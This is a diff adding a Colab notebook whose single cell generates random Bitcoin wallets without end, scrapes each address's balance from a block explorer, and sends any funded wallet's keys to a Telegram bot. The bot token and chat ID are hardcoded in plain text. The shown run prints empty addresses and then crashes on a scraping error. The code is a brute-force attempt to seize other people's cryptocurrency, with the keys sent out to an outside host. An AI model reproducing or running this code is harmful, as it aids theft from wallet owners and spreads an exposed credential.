@@ -1,0 +1,116 @@
+{
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {
+        "id": "view-in-github",
+        "colab_type": "text"
+      },
+      "source": [
+        "<a href=\"https://colab.research.google.com/github/PokrovskiyK/1/blob/main/Check3\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
+      ]
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "!pip install git+https://github.com/fortesp/bitcoinaddress\n",
+        "from bitcoinaddress import Wallet\n",
+        "from bs4 import BeautifulSoup\n",
+        "import requests\n",
+        "\n",
+        "HEADERS = {\n",
+        "    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',\n",
+        "    'accept': '*/*'}\n",
+        "params = \"\"\n",
+        "i = 0\n",
+        "b = 0\n",
+        "while b == 0:\n",
+        "  wallet = Wallet()\n",
+        "  #pubaddr1 = 'bc1qd4ysezhmypwty5dnw7c8nqy5h5nxg0xqsvaefd0qn5kq32vwnwqqgv4rzr'\n",
+        "  pubaddr1 = (wallet.address.__dict__['mainnet'].__dict__['pubaddr1'])\n",
+        "  print(pubaddr1)\n",
+        "  src_balance = requests.get(f'https://live.blockcypher.com/btc/address/{pubaddr1}/',  headers=HEADERS, params = params, stream=True)\n",
+        "  soup_balance = BeautifulSoup (src_balance.content, 'html.parser')\n",
+        "  div = soup_balance.find('div', class_='dash dash-3')\n",
+        "  for li in div.find_all('li'):\n",
+        " #br = li.find('br')\n",
+        "    li_without_BTC = (li.text.replace(\" BTC\",\"\"))\n",
+        "    #print (li_without_BTC)\n",
+        "    i += 1\n",
+        "    if i == 3:\n",
+        "      balance = li.text.replace('Balance','').replace(' BTC','').replace(',','').replace('\\n','')\n",
+        "      print (balance)\n",
+        "      if balance == \"0.0\":\n",
+        "        print(pubaddr1)\n",
+        "        print(f\"Баланс кошелька = {balance}\")\n",
+        "      else:\n",
+        "        b = 1\n",
+        "        print(wallet)\n",
+        "\n",
+        "zapros_telegram1 = f\"https://api.telegram.org/bot2140025296:AAFkkmgdAC0qtgeCq_DqqF3s9UnYZGtlU5w/sendmessage?chat_id=192272396&text={wallet}\"\n",
+        "requests.get(zapros_telegram1)\n",
+        "\n",
+        "    #b = soup_balance.find_all('span', class_='dash-label')\n",
+        "      #print(b)"
+      ],
+      "metadata": {
+        "id": "uUVqL1MtHswB",
+        "outputId": "be06cc97-9bc0-41b7-c92e-e418bf87bfdb",
+        "colab": {
+          "base_uri": "https://localhost:8080/",
+          "height": 495
+        }
+      },
+      "execution_count": 54,
+      "outputs": [
+        {
+          "output_type": "stream",
+          "name": "stdout",
+          "text": [
+            "Collecting git+https://github.com/fortesp/bitcoinaddress\n",
+            "  Cloning https://github.com/fortesp/bitcoinaddress to /tmp/pip-req-build-45n2627s\n",
+            "  Running command git clone -q https://github.com/fortesp/bitcoinaddress /tmp/pip-req-build-45n2627s\n",
+            "Requirement already satisfied: base58 in /usr/local/lib/python3.7/dist-packages (from bitcoinaddress==0.1.5) (2.1.1)\n",
+            "Requirement already satisfied: ecdsa in /usr/local/lib/python3.7/dist-packages (from bitcoinaddress==0.1.5) (0.17.0)\n",
+            "Requirement already satisfied: six>=1.9.0 in /usr/local/lib/python3.7/dist-packages (from ecdsa->bitcoinaddress==0.1.5) (1.15.0)\n",
+            "14qVyGdk5CtyK2vpZE6jWZ3eA95B9abQgL\n",
+            "0.0\n",
+            "14qVyGdk5CtyK2vpZE6jWZ3eA95B9abQgL\n",
+            "Баланс кошелька = 0.0\n",
+            "1FDwvEUnYydjtEjSP1w75C75HT6H4Kkxqx\n",
+            "16K57N1qzARD4s65r6rgNpsAeum1qzU7Ca\n",
+            "17ePyCFQ7MTKhfcsdNtX4qGErRSCPjuqFU\n",
+            "14HdeGT3yozJHMq3Fcm7gieWBE6xJogEnt\n",
+            "1KeeZQVHHrs6vLi7NU3xxyTAERK2kbaea5\n"
+          ]
+        },
+        {
+          "output_type": "error",
+          "ename": "AttributeError",
+          "evalue": "ignored",
+          "traceback": [
+            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
+            "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
+            "\u001b[0;32m<ipython-input-54-82546b82105e>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     18\u001b[0m   \u001b[0msoup_balance\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mBeautifulSoup\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0msrc_balance\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcontent\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'html.parser'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m   \u001b[0mdiv\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msoup_balance\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfind\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'div'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mclass_\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m'dash dash-3'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m   \u001b[0;32mfor\u001b[0m \u001b[0mli\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mdiv\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfind_all\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'li'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m  \u001b[0;31m#br = li.find('br')\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m     \u001b[0mli_without_BTC\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mli\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreplace\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\" BTC\"\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\"\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
+            "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'find_all'"
+          ]
+        }
+      ]
+    }
+  ],
+  "metadata": {
+    "colab": {
+      "collapsed_sections": [],
+      "name": "Добро пожаловать в Colaboratory!",
+      "toc_visible": true,
+      "provenance": [],
+      "include_colab_link": true
+    },
+    "kernelspec": {
+      "display_name": "Python 3",
+      "name": "python3"
+    }
+  },
+  "nbformat": 4,
+  "nbformat_minor": 0
+}
